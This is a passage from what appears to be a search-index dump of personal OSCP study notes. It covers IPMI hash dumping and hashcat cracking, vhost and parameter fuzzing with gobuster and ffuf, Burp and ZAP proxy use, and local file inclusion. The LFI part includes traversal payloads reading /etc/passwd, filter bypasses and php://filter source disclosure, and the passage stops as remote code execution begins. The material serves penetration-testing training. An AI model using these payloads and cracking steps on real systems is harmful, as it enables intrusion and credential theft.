/usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt yes File containing common passwords for offline cracking, one per line RHOSTS 10.129.42.195 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u003cpath\u003e' RPORT 623 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt yes File containing usernames, one per line msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u003e run [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u\nUnderstanding Each Part Command Part Meaning hashcat Runs the Hashcat password cracking tool -m 7300 Specifies the hash type: IPMI 2.0 RAKP (SHA1 hash) ipmi.txt The file containing the captured password hash -a 3 Uses Attack Mode 3 ‚Üí Mask Attack (brute-force with a pattern) ?1?1?1?1?1?1?1?1 The mask ‚Üí It brute-forces an 8-character password -1 ?d?u Defines ?1 as digits (?d) and uppercase letters (?u) hashcat -m 7300 has /usr/share/wordlists/rockyou.txt",
    "description": "Intelligent Platform Management Interface\n[!bash!]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT Nmap scan report for ilo.inlanfreight.local (172.16.2.2) Host is up (0.00064s latency). PORT STATE SERVICE 623/udp open asf-rmcp | ipmi-version: | Version: | IPMI-2.0 | UserAuth: | PassAuth: auth_user, non_null_user |_ Level: 2.0 MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise) Nmap done: 1 IP address (1 host up) scanned in 0.",
    "tags": [],
    "title": "IPMI",
    "uri": "/oscp-notes/ipmi/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Virtual Host Discovery Tools While manual analysis of HTTP headers and reverse DNS lookups can be effective, specialised virtual host discovery tools automate and streamline the process, making it more efficient and comprehensive. These tools employ various techniques to probe the target server and uncover potential virtual hosts.\nSeveral tools are available to aid in the discovery of virtual hosts:\nTool Description Features gobuster A multi-purpose tool often used for directory/file brute-forcing, but also effective for virtual host discovery. Fast, supports multiple HTTP methods, can use custom wordlists. Feroxbuster Similar to Gobuster, but with a Rust-based implementation, known for its speed and flexibility. Supports recursion, wildcard discovery, and various filters. ffuf Another fast web fuzzer that can be used for virtual host discovery by fuzzing the Host header. cube111@local[/local]$ gobuster vhost -u http://inlanefreight.local:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://inlanefreight.local:81 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.6 [+] Timeout: 10s [+] Append Domain: true =============================================================== Starting gobuster in VHOST enumeration mode =============================================================== Found: forum.inlanefreight.local:81 Status: 200 [Size: 100] [...] Progress: 114441 / 114442 (100.00%) =============================================================== Finished ==========================",
    "description": "Virtual Host Discovery Tools While manual analysis of HTTP headers and reverse DNS lookups can be effective, specialised virtual host discovery tools automate and streamline the process, making it more efficient and comprehensive. These tools employ various techniques to probe the target server and uncover potential virtual hosts.\nSeveral tools are available to aid in the discovery of virtual hosts:\nTool Description Features gobuster A multi-purpose tool often used for directory/file brute-forcing, but also effective for virtual host discovery.",
    "tags": [],
    "title": "vhosts",
    "uri": "/oscp-notes/vhosts/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Intro to Web Proxies Burp Suite Installing CA Certificate Another important step when using Burp Proxy/ZAP with our browser is to install the web proxy‚Äôs CA Certificates. If we don‚Äôt do this step, some HTTPS traffic may not get properly routed, or we may need to click accept every time Firefox needs to send an HTTPS request.\nWe can install Burp‚Äôs certificate once we select Burp as our proxy in Foxy Proxy, by browsing to http://burp, and download the certificate from there by clicking on CA Certificate:\nZAP\nIntercepting Web Requests We can choose to step to send the request and examine its response and break any further requests, or we can choose to continue and let the page send the remaining requests. The step button is helpful when we want to examine every step of the page‚Äôs functionality, while continue is useful when we are only interested in a single request and can forward the remaining requests once we reach our target request\nIntercepting Responses Burp In Burp, we can enable response interception by going to (Proxy\u003eOptions) and enabling Intercept Response under Intercept Server Responses:\nLet‚Äôs try changing the type=\"number\" on line 27 to type=\"text\", which should enable us to write any value we want. We will also change the maxlength=\"3\" to maxlength=\"100\" so we can enter longer input:\n\u003cinput type=\"text\" id=\"ip\" name=\"ip\" min=\"1\" max=\"255\" maxlength=\"100\" oninput=\"javascript: if (this.value.length \u003e this.maxLength) this.value = this.value.slice(0, this.maxLength);\" required\u003e ZAP Hidden fields\nEnable input fields Can see comments by turning on comments toggle from left\nAnother similar feature is the Comments button, which will indicate the positions where there are HTML comments that are usually only visible in the source code. We can click on the + button on the left pane and select Comments to add the Comments button, and once we click on it, the Comments indicators should be shown. For example, the below screenshot shows an indicator for a position that has a comment, and hovering over it with our cursor shows the comment‚Äôs content:\nAutomatic Modification Burp Match and Replace We can go to (Proxy\u003eOptions\u003eMatch and Replace) and click on Add in Burp. As the below screenshot shows, we will set the following options\nType: Request header Since the change we want to make will be in the request header and not in its body. Match: ^User-Agent.*$ The regex pattern that matches the entire line with User-Agent in it. Replace: User-Agent: HackTheBox Agent 1.0 This is the value that will replace the line we matched above. Regex match: True We don‚Äôt know the exact User-Agent string we want to replace, so we‚Äôll use regex to match any value that matches the pattern we specified above. ZAP Replacer tools‚Äî-\u003eoptions‚Äî‚Äì\u003ereplacer\nAutomatic Response Modification burp\nZAP\nURL Encoding It is essential to ensure that our request data is URL-encoded and our request headers are correctly set. Otherwise, we may get a server error in the response. This is why encoding and decoding data becomes essential as we modify and repeat web requests. Some of the key characters we need to encode are:\nSpaces: May indicate the end of request data if not encoded \u0026: Otherwise interpreted as a parameter delimiter #: Otherwise interpreted as a fragment identifier To URL-encode text in Burp Repeater, we can select that text and right-click on it, then select (Convert Selection\u003eURL\u003eURL encode key characters), or by selecting the text and clicking [CTRL+U]. Burp also supports URL-encoding as we type if we right-click and enable that option, which will encode all of our text as we type it. On the other hand, ZAP should automatically URL-encode all of our request data in the background before sending the request, though we may not see that explicitly.\nThere are other types of URL-encoding, like Full URL-Encoding or Unicode URL encoding, which may also be helpful for requests with many special characters.\nIn ZAP, we can use the Encoder/Decoder/Hash tool, which will automatically decode strings using various decoders in the Decode tab:[CTRL+E].\nProxying Tools Proxychains One very useful tool in Linux is proxychains, which routes all traffic coming from any command-line tool to any proxy we specify. Proxychains adds a proxy to any command-line tool and is hence the simplest and easiest method to route web traffic of command-line tools through our web proxies.\nTo use proxychains, we first have to edit /etc/proxychains.conf, comment out the final line and add the following line at the end of it:\nProxying Tools\n#socks4 127.0.0.1 9050 http 127.0.0.1 8080 NMAP\ncube111@local[/local]$ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC Starting Nmap 7.91 ( https://nmap.org ) Nmap scan report for SERVER_IP Host is up (0.11s latency). PORT STATE SERVICE PORT/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds Metasploit cube111@local[/local]$ msfconsole msf6 \u003e use auxiliary/scanner/http/robots_txt msf6 auxiliary(scanner/http/robots_txt) \u003e set PROXIES HTTP:127.0.0.1:8080 PROXIES =\u003e HTTP:127.0.0.1:8080 msf6 auxiliary(scanner/http/robots_txt) \u003e set RHOST SERVER_IP RHOST =\u003e SERVER_IP msf6 auxiliary(scanner/http/robots_txt) \u003e set RPORT PORT RPORT =\u003e PORT msf6 auxiliary(scanner/http/robots_txt) \u003e run [*] Scanned 1 of 1 hosts (100% complete) ZAP Scanner Ffuf Directory Fuzzing\ncube111@local[/local]$ ffuf -h HTTP OPTIONS: -H Header `\"Name: Value\"`, separated by colon. Multiple -H flags are accepted. -X HTTP method to use (default: GET) -b Cookie data `\"NAME1=VALUE1; NAME2=VALUE2\"` for copy as curl functionality. -d POST data -recursion Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false) -recursion-depth Maximum recursion depth. (default: 0) -u Target URL ...SNIP... MATCHER OPTIONS: -mc Match HTTP status codes, or \"all\" for everything. (default: 200,204,301,302,307,401,403) -ms Match HTTP response size ...SNIP... FILTER OPTIONS: -fc Filter HTTP status codes from response. Comma separated list of codes and ranges -fs Filter HTTP response size. Comma separated list of sizes and ranges ...SNIP... INPUT OPTIONS: ...SNIP... -w Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD' OUTPUT OPTIONS: -o Write output to file ...SNIP... EXAMPLE USAGE: Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42. Colored, verbose output. ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v ...SNIP... Directory Fuzzing assigning refrencesusinf :FUZZ\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ Now, let‚Äôs start our target in the question below and run our final command on it:\nDirectory Fuzzing\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://SERVER_IP:PORT/FUZZ :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ \u003cSNIP\u003e blog [Status: 301, Size: 326, Words: 20, Lines: 10] :: Progress: [87651/87651] :: Job [1/1] :: 9739 req/sec :: Duration: [0:00:09] :: Errors: 0 :: Page Fuzzing(extensions) cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \u003cSNIP\u003e Note: The wordlist we chose already contains a dot (.), so we will not have to add the dot after ‚Äúindex‚Äù in our fuzzing.\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://SERVER_IP:PORT/blog/indexFUZZ :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 5 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ .php [Status: 200, Size: 0, Words: 1, Lines: 1] .phps [Status: 403, Size: 283, Words: 20, Lines: 10] :: Progress: [39/39] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: We do get a couple of hits, but only .php gives us a response with code 200. Great! We now know that this website runs on PHP to start fuzzing for PHP files.\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://SERVER_IP:PORT/blog/FUZZ.php :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ index [Status: 200, Size: 0, Words: 1, Lines: 1] REDACTED [Status: 200, Size: 465, Words: 42, Lines: 15] :: Progress: [87651/87651] :: Job [1/1] :: 5843 req/sec :: Duration: [0:00:15] :: Errors: 0 :: Recursive Flags In ffuf, we can enable recursive scanning with the -recursion flag, and we can specify the depth with the -recursion-depth flag. If we specify -recursion-depth 1, it will only fuzz the main directories and their direct sub-directories. If any sub-sub-directories are identified (like /login/user, it will not fuzz them for pages). When using recursion in ffuf, we can specify our extension with -e .php\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://SERVER_IP:PORT/FUZZ :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ [Status: 200, Size: 986, Words: 423, Lines: 56] | URL | http://SERVER_IP:PORT/ * FUZZ: [INFO] Adding a new job to the queue: http://SERVER_IP:PORT/forum/FUZZ [Status: 200, Size: 986, Words: 423, Lines: 56] | URL | http://SERVER_IP:PORT/index.php * FUZZ: index.php [Status: 301, Size: 326, Words: 20, Lines: 10] | URL | http://SERVER_IP:PORT/blog | --\u003e | http://SERVER_IP:PORT/blog/ * FUZZ: blog \u003c...SNIP...\u003e [Status: 200, Size: 0, Words: 1, Lines: 1] | URL | http://SERVER_IP:PORT/blog/index.php * FUZZ: index.php [Status: 200, Size: 0, Words: 1, Lines: 1] | URL | http://SERVER_IP:PORT/blog/ * FUZZ: \u003c...SNIP...\u003e Sub-domain Fuzzing cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : https://FUZZ.inlanefreight.com/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 381ms] * FUZZ: support [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 385ms] * FUZZ: ns3 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 402ms] * FUZZ: blog [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 180ms] * FUZZ: my [Status: 200, Size: 22266, Words: 2903, Lines: 316, Duration: 589ms] * FUZZ: www \u003c...SNIP...\u003e Vhosts Fuzzing cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.local:PORT/ -H 'Host: FUZZ.academy.local' /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://academy.local:PORT/ :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ mail2 [Status: 200, Size: 900, Words: 423, Lines: 56] dns2 [Status: 200, Size: 900, Words: 423, Lines: 56] ns3 [Status: 200, Size: 900, Words: 423, Lines: 56] dns1 [Status: 200, Size: 900, Words: 423, Lines: 56] lists [Status: 200, Size: 900, Words: 423, Lines: 56] webmail [Status: 200, Size: 900, Words: 423, Lines: 56] static [Status: 200, Size: 900, Words: 423, Lines: 56] web [Status: 200, Size: 900, Words: 423, Lines: 56] www1 [Status: 200, Size: 900, Words: 423, Lines: 56] \u003c...SNIP...\u003e filtering\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.local:PORT/ -H 'Host: FUZZ.academy.local' -fs 900 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://academy.local:PORT/ :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.academy.local :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 900 ________________________________________________ \u003c...SNIP...\u003e admin [Status: 200, Size: 0, Words: 1, Lines: 1] :: Progress: [4997/4997] :: Job [1/1] :: 1249 req/sec :: Duration: [0:00:04] :: Errors: 0 :: GET Request Fuzzing Similarly to how we have been fuzzing various parts of a website, we will use ffuf to enumerate parameters. Let us first start with fuzzing for GET requests, which are usually passed right after the URL, with a ? symbol, like:\nhttp://admin.academy.local:PORT/admin/admin.php?param1=key. So, all we have to do is replace param1 in the example above with FUZZ and rerun our scan. Before we can start, however, we must pick an appropriate wordlist. Once again, SecLists has just that in /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt. With that, we can run our scan.\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php?FUZZ=key -fs xxx /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://admin.academy.local:PORT/admin/admin.php?FUZZ=key :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 Parameter Fuzzing - POST The main difference between POST requests and GET requests is that POST requests are not passed with the URL and cannot simply be appended after a ? symbol. POST requests are passed in the data field within the HTTP request. Check out the Web Requests module to learn more about HTTP requests.\nTo fuzz the data field with ffuf, we can use the -d flag, as we saw previously in the output of ffuf -h. We also have to add -X POST to send POST requests.\nTip: In PHP, ‚ÄúPOST‚Äù data ‚Äúcontent-type‚Äù can only accept ‚Äúapplication/x-www-form-urlencoded‚Äù. So, we can set that in ‚Äúffuf‚Äù with ‚Äú-H ‚ÄòContent-Type: application/x-www-form-urlencoded‚Äô‚Äù.\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : POST :: URL : http://admin.academy.local:PORT/admin/admin.php :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Header : Content-Type: application/x-www-form-urlencoded :: Data : FUZZ=key :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: xxx ________________________________________________ id [Status: xxx, Size: xxx, Words: xxx, Lines: xxx] \u003c...SNIP...\u003e cube111@local[/local]$ curl http://admin.academy.local:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded' \u003cdiv class='center'\u003e\u003cp\u003eInvalid id!\u003c/p\u003e\u003c/div\u003e \u003c...SNIP...\u003e Value Fuzzing cube111@local[/local]$ for i in $(seq 1 1000); do echo $i \u003e\u003e ids.txt; done cube111@local[/local]$ ffuf -w ids.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.0.2 ________________________________________________ :: Method : POST :: URL : http://admin.academy.local:30794/admin/admin.php :: Header : Content-Type: application/x-www-form-urlencoded :: Data : id=FUZZ :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: xxx ________________________________________________ \u003c...SNIP...\u003e [Status: xxx, Size: xxx, Words: xxx, Lines: xxx] Local File Inclusion (LFI) PHP versions before 5.3/5.4\nservers are /etc/passwd on Linux and C:\\Windows\\boot.ini on Windows. So, let‚Äôs change the parameter from es to /etc/passwd:\nFilename Prefix In our previous example, we used the language parameter after the directory, so we could traverse the path to read the passwd file. On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:\nCode: php\ninclude(\"./languages/\" . $_GET['language']); include(\"lang_\" . $_GET['language']); In this case, if we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid:\nhttp://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=/../../../etc/passwd\nBasic Bypasses Non-Recursive Path Traversal Filters One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals. For example:\nCode: php\n$language = str_replace('../', '', $_GET['language']); http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=‚Ä¶.//‚Ä¶.//‚Ä¶.//‚Ä¶.//etc/passwd\nAs we can see, the inclusion was successful this time, and we‚Äôre able to read /etc/passwd successfully. The ....// substring is not the only bypass we can use, as we may use ..././ or ....\\/ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ....\\/), or adding extra forward slashes (e.g. ....////)\nEncoding Approved Paths Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the ./languages directory, as follows:\nCode: php\nif(preg_match('/^\\.\\/languages\\/.+$/', $_GET['language'])) { include($_GET['language']); } else { echo 'Illegal path specified!'; } \u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=./languages/../../../../etc/passwd\nCheck for vulnerable versions\nAppended Extension As discussed in the previous section, some web applications append an extension to our input string (e.g. .php), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).\nThere are a couple of other techniques we may use, but they are obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.\nPath Truncation In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).\nIf we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.\nAn example of such payload would be the following:\nCode: url\n?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times] Of course, we don‚Äôt have to manually type ./ 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:\nBasic Bypasses\ncube111@local[/local]$ echo -n \"non_existing_directory/../../../etc/passwd/\" \u0026\u0026 for i in {1..2048}; do echo -n \"./\"; done non_existing_directory/../../../etc/passwd/./././\u003cSNIP\u003e././././ We may also increase the count of ../, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only .php gets truncated and not our requested file at the end of the string (/etc/passwd). This is why it would be easier to use the first method.\nNull Bytes PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.\nTo exploit this vulnerability, we can end our payload with a null byte (e.g. /etc/passwd%00), such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.\nPHP Filters Input Filters PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.\nThe filter wrapper has several parameters, but the main ones we require for our attack are resource and read. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.\nThere are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.\nFuzzing for PHP Files cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/FUZZ.php ...SNIP... index [Status: 200, Size: 2652, Words: 690, Lines: 64] config [Status: 302, Size: 0, Words: 1, Lines: 1] Source Code Disclosure php://filter/read=convert.base64-encode/resource=config We can now investigate this file for sensitive information like credentials or database keys and start identifying further references and then disclose their sources.\nData The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. So, let‚Äôs first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.\nChecking PHP Configurations To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn‚Äôt locate the configuration file. We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking. Finally, we‚Äôll use\ncube111@local[/local]$ curl \"http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini\" cube111@local[/local]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include allow_url_include = On Remote Code Execution With allow_url_include enabled, we can proceed with our data wrapper attack. As mentioned earlier, the data wrapper 